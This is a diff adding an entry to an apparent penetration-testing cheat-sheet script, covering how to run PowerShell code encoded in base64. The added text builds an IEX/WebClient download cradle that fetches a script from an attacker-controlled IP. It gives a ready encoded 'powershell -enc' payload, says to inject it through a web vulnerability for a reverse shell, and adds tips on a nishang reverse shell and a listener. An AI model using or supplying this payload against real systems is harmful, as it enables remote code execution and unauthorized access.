@@ -2201,3 +2201,24 @@ youtube-dl --extract-audio --audio-format mp3 https://www.youtube.com/watch?v=IW
 """
 
 
+
+######################################
+######################################
+
+powershell_enc = Cheat("PowerShell exec code in base64")
+powershell_enc.category = "Windows"
+powershell_enc.subCategory = "PowerShell"
+powershell_enc.output = f"""[*] PowerShell execute code in base64 for easy control bad chars on webexploit
+
+# Create the string for windows in 16bytes little endian
+echo 'IEX(New-Object Net.WebClient).downloadString("http://{ip}/IP.ps1")' | iconv -t utf-16le | base64 -w 0
+
+# Take the output and pass it to web vulnerability to get reverse shell (for example...)
+powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEAMgAwAC8ASQBQAC4AcABzADEAIgApAAoA
+
+# TIPS: listener...
+# TIPS: reverse shell nishang (or other...) with name IP.ps1 like the comand...
+# TIPS: change last line of nishang reverse shell to auto execute the reverse shell...
+# TIPS: rlwrap, for pseudo historic and move with arrows
+
+"""
